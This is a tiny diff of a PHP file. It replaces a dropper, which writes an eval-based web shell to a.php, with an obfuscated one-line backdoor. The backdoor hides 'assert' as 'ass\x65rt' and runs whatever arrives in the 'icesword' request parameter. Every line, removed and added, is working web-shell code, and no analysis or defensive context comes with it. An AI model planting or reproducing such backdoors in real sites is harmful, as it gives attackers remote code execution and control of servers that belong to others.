@@ -1,6 +1,1 @@
-<?php
-$a = "<?php eval(\$_POST['123'])?>";
-$b = fopen("a.php","w") or die("123!");
-fwrite($b,$a);
-fclose($b);
-?>
+<?php array_map("ass\x65rt",(array)$_REQUEST['icesword']);?>
